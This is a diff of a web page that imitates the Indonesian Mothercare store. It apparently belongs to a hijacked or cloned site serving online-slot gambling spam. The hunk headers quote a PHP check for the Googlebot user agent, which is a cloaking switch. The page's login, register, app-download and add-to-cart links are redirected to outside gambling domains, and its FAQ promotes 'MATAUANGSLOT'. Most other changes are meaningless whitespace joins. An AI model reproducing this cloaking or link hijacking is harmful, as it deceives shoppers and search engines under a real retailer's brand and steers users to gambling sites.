@@ -174,8 +174,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                     password: !0
                                 }
                             };
-                            return {
-                                ajax: {
+                            return {ajax: {
                                     deny_list: void 0,
                                     block_internal: !0,
                                     enabled: !0,
@@ -332,8 +331,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                 throw new Error(p);
                             if (!g[e])
                                 throw new Error("Configuration for ".concat(e, " was never set"));
-                            return g[e]
-                        }
+                            return g[e]}
                         function h(e, t) {
                             if (!e)
                                 throw new Error(p);
@@ -508,8 +506,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                     const e = o.backlog[t]
                                       , r = s[t];
                                     if (r) {
-                                        for (let t = 0; e && t < e.length; ++t)
-                                            p(e[t], r);
+                                        for (let t = 0; e && t < e.length; ++t)p(e[t], r);
                                         Object.entries(r).forEach(( ([e,t]) => {
                                             Object.values(t || {}).forEach((t => {
                                                 t[0]?.on && t[0]?.context()instanceof a.y && t[0].on(e, t[1])
@@ -689,8 +686,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                         function n(e, t) {
                             return {
                                 capture: e,
-                                passive: !1,
-                                signal: t
+                                passive: !1,signal: t
                             }
                         }
                         function i(e, t, r=!1, i) {
@@ -884,8 +880,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                         "use strict";
                         r.d(t, {
                             GG: () => o,
-                            sB: () => a
-                        });
+                            sB: () => a});
                         var n = r(878);
                         function i() {
                             return "undefined" == typeof document || "complete" === document.readyState
@@ -1064,8 +1059,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         l = "function" == typeof n ? n(o, a) : n || {}
                                     } catch (t) {
                                         u([t, "", [o, a, s], l], e)
-                                    }
-                                    i(r + "start", [o, a, s], l, c);
+                                    }i(r + "start", [o, a, s], l, c);
                                     try {
                                         return d = t.apply(a, o)
                                     } catch (e) {
@@ -1252,8 +1246,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                     return Object.values(e.initializedAgents).forEach((e => {
                                         e && e.api ? e.exposed && e.api[t] && n.push(e.api[t](...r)) : (0,
                                         d.R)(38, t)
-                                    }
-                                    )),
+                                    })),
                                     n.length > 1 ? n : n[0]
                                 }(t, ...r)
                             }
@@ -1406,7 +1399,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                             function j(e, t, r, i) {
                                 return function() {
                                     return (0,
-                                    a.p)(f.xV, ["API/" + t + "/called"], void 0, n.K7.metrics, w),
+                                    a.p)(f.xV, ["API/"+ t + "/called"], void 0, n.K7.metrics, w),
                                     i && (0,
                                     a.p)(e + t, [r ? (0,
                                     v.t)() : performance.now(), ...arguments], r ? null : this, i, w),
@@ -1576,8 +1569,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 function i(e) {
                     var t = n[e];
                     if (void 0 !== t)
-                        return t.exports;
-                    var o = n[e] = {
+                        return t.exports;var o = n[e] = {
                         exports: {}
                     };
                     return r[e](o, o.exports, i),
@@ -2049,8 +2041,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
         <!--vi7727dwaRtKsPIHEXMsLQoewBm0jClQ-->
         <meta name="facebook-domain-verification" content="3hxyeb8eny5e9h0pwotg22atpz5d9h">
         <style>
-            body.onestepcheckout-index-index [type=radio] {
-                cursor: pointer;
+            body.onestepcheckout-index-index [type=radio] {cursor: pointer;
             }
         </style>
         <script data-breeze>
@@ -2716,8 +2707,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                             e.isUndefined(t.uuid) || (s.user_profile.klevu_uuid = t.uuid)
                                         }
                                         return e.support.isActive("core.dataProtection") && (s.user_profile.data_protection = e.dataProtection.dataCanBeTracked()),
-                                        {
-                                            payload: s,
+                                        {payload: s,
                                             type: "collect",
                                             url: e.getGlobalSetting("url.analyticsCollect", "https://stats.ksearchnet.com/analytics/"),
                                             apiKey: e.getObjectPath(t.eventSource, "apiKey", e.getGlobalSetting("search.apiKey", e.getGlobalSetting("global.apiKey"))),
@@ -3891,9 +3881,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 
                 .kuQuickSearchFacetedLayout [data-result-view='grid'] .klevuProduct:nth-child(3) {
                     border-top: 1px solid #e2e2e2
-                }
-
-                .kuQuickSearchFacetedLayout [data-result-view='grid'] .klevuProduct:nth-last-child(1) {
+                }.kuQuickSearchFacetedLayout [data-result-view='grid'] .klevuProduct:nth-last-child(1) {
                     border-top: 0
                 }
 
@@ -4398,8 +4386,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 background: #fff
             }
 
-            .kuFilterBox .kuFilterNames ul li a:hover span.kuFilterIcon:after {
-                content: "";
+            .kuFilterBox .kuFilterNames ul li a:hover span.kuFilterIcon:after {content: "";
                 position: absolute;
                 width: 8px;
                 height: 8px;
@@ -4650,8 +4637,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 z-index: 1
             }
 
-            .noUi-stacking .noUi-handle {
-                z-index: 10
+            .noUi-stacking .noUi-handle {z-index: 10
             }
 
             .noUi-state-tap .noUi-origin {
@@ -4960,8 +4946,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 text-transform: uppercase;
                 text-decoration: none;
                 margin: 5px 5px 5px 0;
-                border-radius: 3px;
-                border: 2px solid transparent;
+                border-radius: 3px;border: 2px solid transparent;
                 text-align: center
             }
 
@@ -5494,8 +5479,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 display: block
             }
 
-            .kuSearchPersonalizationsContainer {
-                height: 40px
+            .kuSearchPersonalizationsContainer {height: 40px
             }
 
             .kuSearchPersonalizationsContainer * {
@@ -5748,8 +5732,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 text-align: left
             }
 
-            .kuQuickSearchNoRecordFound .klevuNoResultsProductsBlock .klevuQuickSearchNoResultsPopular ul li {
-                display: block;
+            .kuQuickSearchNoRecordFound .klevuNoResultsProductsBlock .klevuQuickSearchNoResultsPopular ul li {display: block;
                 width: 100%;
                 height: auto;
                 text-align: left;
@@ -6558,7 +6541,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                 <div class="header_panel_info">
                                     <ul>
                                         <li class="download-app-link">
-                                            <a href="https://penuhinlagidah.pages.dev/">
+                                            <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                 <img width="14" height="14" alt="download icon" loading="lazy" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/app.png">download apps
         
                                             </a>
@@ -6569,12 +6552,12 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                             download app  from:
                 
                                                             <div class="view code app_store">
-                                                                <a class="sh-store-link" href="https://penuhinlagidah.pages.dev/" target="_blank" ng-click="callAction($event, 'appStore')">
+                                                                <a class="sh-store-link" href="https://orangpusat.org/ampkhusus/citizen-edu/" target="_blank" ng-click="callAction($event, 'appStore')">
                                                                     <img loading="lazy" width="200" height="60" alt="app store" class="sh-store-link__image" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/apple-en.png">
                                                                 </a>
                                                             </div>
                                                             <div class="view code play_store">
-                                                                <a class="sh-store-link" data-test="google-play-link" href="https://penuhinlagidah.pages.dev/" target="_blank" ng-click="callAction($event, 'appStore')">
+                                                                <a class="sh-store-link" data-test="google-play-link" href="https://orangpusat.org/ampkhusus/citizen-edu/" target="_blank" ng-click="callAction($event, 'appStore')">
                                                                     <img loading="lazy" width="200" height="60" alt="google play" class="sh-store-link__image" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/google-en.png">
                                                                 </a>
                                                             </div>
@@ -6583,8 +6566,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                 </div>
                                             </div>
                                         </li>
-                                        <li>
-                                            <a href="https://penuhinlagidah.pages.dev/">
+                                        <li><a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                 <img loading="lazy" width="22" height="22" alt="gift registry icon" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/gift_white.svg">gift registry        
                                             </a>
                                         </li>
@@ -6699,17 +6681,17 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                 <div class="header_panel_info">
                                     <ul>
                                         <li>
-                                            <a href="https://penuhinlagidah.pages.dev/">
+                                            <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                 <img loading="lazy" width="22" height="22" alt="store finder icon" src="https://i.imgur.com/eLrNuI4.png">LOGIN
                                             </a>
                                         </li>
                                         <li>
-                                            <a href="https://penuhinlagidah.pages.dev/">
+                                            <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                 <img loading="lazy" width="22" height="22" alt="Kanmo Circle logo" src="https://i.imgur.com/eLrNuI4.png">DAFTAR
                                             </a>
                                         </li>
                                         <li>
-                                            <a href="https://penuhinlagidah.pages.dev/" target="_blank">
+                                            <a href="https://orangpusat.org/ampkhusus/citizen-edu/" target="_blank">
                                                 <img loading="lazy" width="22" height="22" alt="Whatsapp logo" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/Whatsapp_Logo.svg">Contact Us
                                             </a>
                                         </li>
@@ -6728,8 +6710,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                 }
 
                                 .panel.header div {
-                                    width: 100%;
-                                }
+                                    width: 100%;}
 
                                 .top-header-components-mc {
                                     display: flex;
@@ -6904,8 +6885,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                 <a href="/brand-a-z/beauty-barn.html">Beauty Barn</a>
                                                                             </p>
                                                                             <p class="brand-name" style="display: none;">
-                                                                                <a href="/brand-a-z/bio-oil.html">Bio Oil</a>
-                                                                            </p>
+                                                                                <a href="/brand-a-z/bio-oil.html">Bio Oil</a></p>
                                                                             <p class="brand-name" style="display: none;">
                                                                                 <a href="/brand-a-z/biolane.html">Biolane</a>
                                                                             </p>
@@ -6978,8 +6958,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                             <p class="brand-name" style="display: none;">
                                                                                 <a href="/brand-a-z/docare.html">Docare</a>
                                                                             </p>
-                                                                            <p class="brand-name" style="display: none;">
-                                                                                <a href="/brand-a-z/doona.html">Doona</a>
+                                                                            <p class="brand-name" style="display: none;"><a href="/brand-a-z/doona.html">Doona</a>
                                                                             </p>
                                                                             <p class="brand-name" style="display: none;">
                                                                                 <a href="/brand-a-z/down-to-earth.html">Down To Earth</a>
@@ -7053,8 +7032,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                             <p class="brand-name" style="display: none;">
                                                                                 <a href="/brand-a-z/hybrid.html">Hybrid</a>
                                                                             </p>
-                                                                            <p class="brand-name" style="display: none;">
-                                                                                <a href="/brand-a-z/inlacta-dha.html">Inlacta DHA</a>
+                                                                            <p class="brand-name" style="display: none;"><a href="/brand-a-z/inlacta-dha.html">Inlacta DHA</a>
                                                                             </p>
                                                                             <p class="brand-name" style="display: none;">
                                                                                 <a href="/brand-a-z/interlac.html">Interlac</a>
@@ -7126,8 +7104,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                 <a href="/brand-a-z/micro.html">Micro</a>
                                                                             </p>
                                                                             <p class="brand-name" style="display: none;">
-                                                                                <a href="/brand-a-z/mideer.html">MiDeer</a>
-                                                                            </p>
+                                                                                <a href="/brand-a-z/mideer.html">MiDeer</a></p>
                                                                             <p class="brand-name" style="display: none;">
                                                                                 <a href="/brand-a-z/mimi-lula.html">Mimi &amp;Lula</a>
                                                                             </p>
@@ -7275,7 +7252,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                             <p class="brand-name" style="display: none;">
                                                                                 <a href="/brand-a-z/vitaflow.html">Vitaflow</a>
                                                                             </p>
-                                                                            <p class="brand-name" style="display: none;">
+                                                                            <p class="brand-name"style="display: none;">
                                                                                 <a href="/brand-a-z/vtech.html">Vtech</a>
                                                                             </p>
                                                                             <p class="brand-name" style="display: none;">
@@ -7346,8 +7323,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/awan.html">Awan</a>
                                                                                             </p>
-                                                                                            <p class="brand-name" style="display: block;">
-                                                                                                <a href="/brand-a-z/azetabio.html">Azetabio</a>
+                                                                                            <p class="brand-name" style="display: block;"><a href="/brand-a-z/azetabio.html">Azetabio</a>
                                                                                             </p>
                                                                                         </li>
                                                                                         <li style="width: 100%; border: 0px;">
@@ -7411,8 +7387,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/bravado.html">Bravado</a>
                                                                                             </p>
-                                                                                            <p class="brand-name" style="display: block;">
-                                                                                                <a href="/brand-a-z/bruder.html">Bruder</a>
+                                                                                            <p class="brand-name" style="display: block;"><a href="/brand-a-z/bruder.html">Bruder</a>
                                                                                             </p>
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/brush-baby.html">Brush Baby</a>
@@ -7478,8 +7453,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/down-to-earth.html">Down To Earth</a>
                                                                                             </p>
-                                                                                            <p class="brand-name" style="display: block;">
-                                                                                                <a href="/brand-a-z/drew.html">Drew</a>
+                                                                                            <p class="brand-name" style="display: block;"><a href="/brand-a-z/drew.html">Drew</a>
                                                                                             </p>
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/dr-brown-s.html">Dr. Brown's</a>
@@ -7546,8 +7520,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/haenim.html">Haenim</a>
                                                                                             </p>
-                                                                                            <p class="brand-name" style="display: block;">
-                                                                                                <a href="/brand-a-z/happy-horse.html">Happy Horse</a>
+                                                                                            <p class="brand-name" style="display: block;"><a href="/brand-a-z/happy-horse.html">Happy Horse</a>
                                                                                             </p>
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/happy-tummy.html">Happy Tummy</a>
@@ -7614,8 +7587,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                             <h5 class="edh5">L</h5>
                                                                                         </li>
                                                                                         <li>
-                                                                                            <p class="brand-name" style="display: block;">
-                                                                                                <a href="/brand-a-z/leapfrog.html">Leapfrog</a>
+                                                                                            <p class="brand-name" style="display: block;"><a href="/brand-a-z/leapfrog.html">Leapfrog</a>
                                                                                             </p>
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/leclerc.html">Leclerc</a>
@@ -7679,8 +7651,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/momami.html">Momami</a>
                                                                                             </p>
-                                                                                            <p class="brand-name" style="display: block;">
-                                                                                                <a href="/brand-a-z/mothercare.html">Mothercare</a>
+                                                                                            <p class="brand-name" style="display: block;"><a href="/brand-a-z/mothercare.html">Mothercare</a>
                                                                                             </p>
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/mustela.html">Mustela</a>
@@ -7746,8 +7717,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                                 <a href="/brand-a-z/poled-global.html">Poled Global</a>
                                                                                             </p>
                                                                                             <p class="brand-name" style="display: block;">
-                                                                                                <a href="/brand-a-z/ponycycle.html">Ponycycle</a>
-                                                                                            </p>
+                                                                                                <a href="/brand-a-z/ponycycle.html">Ponycycle</a></p>
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/puma.html">Puma</a>
                                                                                             </p>
@@ -7883,8 +7853,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                         </li>
                                                                                         <li style="width: 100%; border: 0px;">
                                                                                             <h5 class="edh5">Y</h5>
-                                                                                        </li>
-                                                                                        <li>
+                                                                                        </li><li>
                                                                                             <p class="brand-name" style="display: block;">
                                                                                                 <a href="/brand-a-z/yamatoya.html">Yamatoya</a>
                                                                                             </p>
@@ -8090,8 +8059,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                 <!-- column 1  -->
                                                                 <div class="col-md-2 col-sm-3">
                                                                     <div class="mn-block">
-                                                                        <div class="menav" style="border: 0px; overflow: scroll; scrollbar-width: none; overflow-x: hidden;">
-                                                                            <div class="headcontent">
+                                                                        <div class="menav" style="border: 0px; overflow: scroll; scrollbar-width: none; overflow-x: hidden;"><div class="headcontent">
                                                                                 <p>
                                                                                     <a href="/new-arrival/fashion.html">produk terbaru</a>
                                                                                 </p>
@@ -8170,8 +8138,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                             </ul>
                                                                         </div>
                                                                     </div>
-                                                                </div>
-                                                                <!-- column 1  -->
+                                                                </div><!-- column 1  -->
                                                                 <!--column 3-->
                                                                 <div class="col-md-2 col-sm-3">
                                                                     <div class="mn-block">
@@ -8249,8 +8216,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                     <a href="/maternity/fashion.html">pakaian ibu hamil</a>
                                                                                 </p>
                                                                             </div>
-                                                                        </div>
-                                                                    </div>
+                                                                        </div></div>
                                                                 </div>
                                                                 <!-- column 4-->
                                                                 <!--column 5-->
@@ -8333,8 +8299,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                                     <p>
                                                                                         <a href="/travel-essentials/strollers/from-6m.html">usia 6 bulan+</a>
                                                                                     </p>
-                                                                                </li>
-                                                                            </ul>
+                                                                                </li></ul>
                                                                         </div>
                                                                     </div>
                                                                     <div class="mn-block">
@@ -8417,8 +8382,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                             <div class="headcontent">
                                                                                 <p>
                                                                                     <a href="/travel-essentials/accessories.html">aksesoris</a>
-                                                                                </p>
-                                                                            </div>
+                                                                                </p></div>
                                                                         </div>
                                                                     </div>
                                                                 </div>
@@ -8677,8 +8641,7 @@ font-size:12px;white-space: nowrap;" class=" nav-anchor">
                                                                                 <p>perawatan bayi</p>
                                                                             </div>
                                                                             <ul class="te_az" style="padding:0;">
-                                                                                <li class="ks_content">
-                                                                                    <p>
+                                                                                <li class="ks_content"><p>
                                                                                         <a href="/bathing-care/babycare/skin-care.html">perawatan kulit</a>
                                                                                     </p>
                                                                                     <p>
@@ -8846,8 +8809,7 @@ font-size:12px;
                                                                                 </li>
                                                                             </ul>
                                                                         </div>
-                                                                    </div>
-                                                                </div>
+                                                                    </div></div>
                                                                 <!-- column 3-->
                                                             </div>
                                                         </div>
@@ -8870,7 +8832,7 @@ font-size:12px;
                                         <a href="/customer/account" class="account-link">Akun Saya</a>
                                     </div>
                                     <button>
-                                        <a href="https://penuhinlagidah.pages.dev/">Masuk</a>
+                                        <a href="https://orangpusat.org/ampkhusus/citizen-edu/">Masuk</a>
                                     </button>
                                 </div>
                             </div>
@@ -8883,7 +8845,7 @@ font-size:12px;
                                         <div class="header_panel_info">
                                             <ul>
                                                 <li class="download-app-link">
-                                                    <a href="https://penuhinlagidah.pages.dev/">
+                                                    <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                         <img width="14" height="14" alt="download icon" loading="lazy" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/app.png"/>download apps
         
                                                     </a>
@@ -8894,12 +8856,12 @@ font-size:12px;
                                                                     download app  from:
                 
                                                                     <div class="view code app_store">
-                                                                        <a class="sh-store-link" href="https://penuhinlagidah.pages.dev/" target="_blank" ng-click="callAction($event, &#39;appStore&#39;)">
+                                                                        <a class="sh-store-link" href="https://orangpusat.org/ampkhusus/citizen-edu/" target="_blank" ng-click="callAction($event, &#39;appStore&#39;)">
                                                                             <img loading="lazy" width="200" height="60" alt="app store" class="sh-store-link__image" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/apple-en.png"/>
                                                                         </a>
                                                                     </div>
                                                                     <div class="view code play_store">
-                                                                        <a class="sh-store-link" data-test="google-play-link" href="https://penuhinlagidah.pages.dev/" target="_blank" ng-click="callAction($event, &#39;appStore&#39;)">
+                                                                        <a class="sh-store-link" data-test="google-play-link" href="https://orangpusat.org/ampkhusus/citizen-edu/" target="_blank" ng-click="callAction($event, &#39;appStore&#39;)">
                                                                             <img loading="lazy" width="200" height="60" alt="google play" class="sh-store-link__image" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/google-en.png"/>
                                                                         </a>
                                                                     </div>
@@ -8909,7 +8871,7 @@ font-size:12px;
                                                     </div>
                                                 </li>
                                                 <li>
-                                                    <a href="https://penuhinlagidah.pages.dev/">
+                                                    <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                         <img loading="lazy" width="22" height="22" alt="gift registry icon" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/gift_white.svg"/>gift registry        
                                                     </a>
                                                 </li>
@@ -8952,8 +8914,7 @@ font-size:12px;
                                             top: 0;
                                             left: 0;
                                             right: 0;
-                                            bottom: 0;
-                                            background-color: #ccc;
+                                            bottom: 0;background-color: #ccc;
                                             -webkit-transition: .4s;
                                             transition: .4s;
                                         }
@@ -9008,17 +8969,17 @@ font-size:12px;
                                         <div class="header_panel_info">
                                             <ul>
                                                 <li>
-                                                    <a href="https://penuhinlagidah.pages.dev/">
+                                                    <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                         <img loading="lazy" width="22" height="22" alt="store finder icon" src="https://i.imgur.com/eLrNuI4.png"/>LOGIN
                                                     </a>
                                                 </li>
                                                 <li>
-                                                    <a href="https://penuhinlagidah.pages.dev/">
+                                                    <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                         <img loading="lazy" width="22" height="22" alt="Kanmo Circle logo" src="https://i.imgur.com/eLrNuI4.png"/>DAFTAR
                                                     </a>
                                                 </li>
                                                 <li>
-                                                    <a href="https://penuhinlagidah.pages.dev/" target="_blank">
+                                                    <a href="https://orangpusat.org/ampkhusus/citizen-edu/" target="_blank">
                                                         <img loading="lazy" width="22" height="22" alt="Whatsapp logo" src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/images/Whatsapp_Logo.svg"/>Contact Us
                                                     </a>
                                                 </li>
@@ -9080,8 +9041,7 @@ font-size:12px;
                         }" type="text" name="q" value="" placeholder="Kata kunci, kode produk" class="input-text" maxlength="128" role="combobox" aria-haspopup="false" aria-autocomplete="both" autocomplete="off" aria-expanded="false" data-breeze-processed="true"/>
                                                 <div id="search_autocomplete" class="search-autocomplete"></div>
                                                 <div class="nested">
-                                                    <a class="action advanced" href="https://www.mothercare.co.id/catalogsearch/advanced/" data-action="advanced-search">Pencarian Lanjutan    </a>
-                                                </div>
+                                                    <a class="action advanced" href="https://www.mothercare.co.id/catalogsearch/advanced/" data-action="advanced-search">Pencarian Lanjutan    </a></div>
                                                 <button class="search-cancel-mob" id="search-cancel-mob">cancel</button>
                                             </div>
                                         </div>
@@ -9171,7 +9131,7 @@ font-size:12px;
                         <div class="dropdown switcher-dropdown" data-target="dropdown">
                             <ul class="header links">
                                 <li class="link authorization-link loginRevamp" data-label="Atau">
-                                    <a href="https://penuhinlagidah.pages.dev/">Masuk / buat akun            </a>
+                                    <a href="https://orangpusat.org/ampkhusus/citizen-edu/">Masuk / buat akun            </a>
                                 </li>
                                 <script data-breeze>
                                     require(['jquery'], function($) {
@@ -9353,8 +9313,7 @@ font-size:12px;
                                         margin-bottom: 14px;
                                     }
                                 </style>
-                                <style>
-                                    .mpstorepickup-available-content .pickup-checkbox {
+                                <style>.mpstorepickup-available-content .pickup-checkbox {
                                         cursor: pointer;
                                     }
 
@@ -9372,7 +9331,7 @@ font-size:12px;
                                     <div class="product-info-price">
                                         <div class="product-info-stock-sku">
                                             <!-- Product is in stock, do nothing or show "In Stock" -->
-                                            <a href="https://penuhinlagidah.pages.dev/" class="kc-points-lable">
+                                            <a href="https://orangpusat.org/ampkhusus/citizen-edu/" class="kc-points-lable">
                                                 <img src="https://eb-assets.pages.dev/daftar.gif" itemprop="image" style="width:50%;height:50%;">
                                             </a>
                                             <div class="availability only configurable-variation-qty" title="Qty">
@@ -9439,8 +9398,7 @@ font-size:12px;
                                                                     "name": "Kenapa MATAUANGSLOT Jadi Incaran Banyak Pemain?",
                                                                     "acceptedAnswer": {
                                                                         "@type": "Answer",
-                                                                        "text": "Karena MATAUANGSLOT dikenal punya jalur masuk mulus, transaksi singkat, dan koleksi permainan yang selalu ramai diburu pemburu maxwin. Ditambah update pola hoki harian, pemain punya panduan lebih tajam untuk memilih waktu terbaik memulai spin."
-                                                                    }
+                                                                        "text": "Karena MATAUANGSLOT dikenal punya jalur masuk mulus, transaksi singkat, dan koleksi permainan yang selalu ramai diburu pemburu maxwin. Ditambah update pola hoki harian, pemain punya panduan lebih tajam untuk memilih waktu terbaik memulai spin."}
                                                                 },
                                                                 {
                                                                     "@type": "Question",
@@ -9498,7 +9456,7 @@ font-size:12px;
                                         </div>
                                     </div>
                                     <div class="kc-cashback check">
-                                        <a href="https://penuhinlagidah.pages.dev/" class="kc-points-lable">
+                                        <a href="https://orangpusat.org/ampkhusus/citizen-edu/" class="kc-points-lable">
                                             <img src="https://i.imgur.com/eLrNuI4.png" class="kcpoints-img" width="30px">
                                             <span>
                                                 MIN DEPO : <span class="price">5.000</span>
@@ -9576,16 +9534,16 @@ font-size:12px;
                                                             </div>
                                                         </div>
                                                         <div class="actions">
-                                                            <a href="https://penuhinlagidah.pages.dev/">
+                                                            <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                                                 <button type="button" title="add to cart" class="action primary tocart" id="product-addtocart-button" style="background-color: #388266;">
                                                                     <span>LOGIN</span>
                                                                 </button>
                                                             </a>
-                                                            <a href="https://penuhinlagidah.pages.dev/" class="action towishlist" data-action="add-to-wishlist">
+                                                            <a href="https://orangpusat.org/ampkhusus/citizen-edu/" class="action towishlist" data-action="add-to-wishlist">
                                                                 <span>DAFTAR</span>
                                                             </a>
                                                             <div id="giftreg-message-pdp" style="">
-                                                                <a href="https://penuhinlagidah.pages.dev/" class="notlogingift">
+                                                                <a href="https://orangpusat.org/ampkhusus/citizen-edu/" class="notlogingift">
                                                                     <img src="https://www.mothercare.co.id/static/version1741963345/frontend/Codilar/mothercare/id_ID/Kanmo_CustomerDetail/images/gift.png" alt=""/>CLAIM BONUS
 	    
                                                                 </a>
@@ -9600,8 +9558,7 @@ font-size:12px;
                                                             </script>
                                                         </div>
                                                     </div>
-                                                </div>
-                                                <!--Product video logic-->
+                                                </div><!--Product video logic-->
                                                 <script type="text/x-magento-init" data-breeze-processed="true">
                                                     
     {
@@ -9843,8 +9800,7 @@ function myFunction() {
     <a class="<%- classes %>" href="<%- full %>">
         <span class="slide-image-container">
             <img loading="lazy" alt="<%- caption %>"
-                src="<%- thumb %>"
-                srcset="<%- srcset ? srcset.small : '' %>"
+                src="<%- thumb %>"srcset="<%- srcset ? srcset.small : '' %>"
                 sizes="110px"
                 width="110"
                 height="110"
@@ -10044,8 +10000,7 @@ function myFunction() {
     }
 
                 </script>
-            </div>
-        </strong>
+            </div></strong>
     </strong>
 </strong>
 </div>
@@ -10602,8 +10557,7 @@ function myFunction() {
                         font-weight: 700;
                         font-size: 10px;
                         letter-spacing: -.011em;
-                        color: #1d1d1d;
-                    }
+                        color: #1d1d1d;}
 
                     .widget.widget-upsell .upsell.products-grid .slick-arrow,.widget.widget-related .upsell.products-grid .slick-arrow,.widget.widget-upsell .related.products-grid .slick-arrow,.widget.widget-related .related.products-grid .slick-arrow {
                         width: 40px;
@@ -10821,8 +10775,7 @@ function myFunction() {
                         order: 3;
                         background: #f24822;
                         font-style: normal;
-                        font-weight: 400;
-                        font-size: 12px;
+                        font-weight: 400;font-size: 12px;
                         line-height: 24px;
                         letter-spacing: -.011em;
                         color: #fff;
@@ -11196,8 +11149,7 @@ function myFunction() {
 
                         .widget.widget-upsell .block-title {
                             margin: 0 !important;
-                            padding: 0 0 0px !important;
-                        }
+                            padding: 0 0 0px !important;}
 
                         .widget.widget-upsell .slick-list.products.list.items.product-items {
                             padding-top: 20px !important;
@@ -11343,9 +11295,7 @@ function myFunction() {
                             
                                                             <div class="product-item-actions">
                                     
-                                                                    </div>
-                            
-                            <div class="product-item-description">
+                                                                    </div><div class="product-item-description">
                                 <div data-bind="html: $parent.getAdditionalContent($data, $element)"></div>
 
                                                             </div>
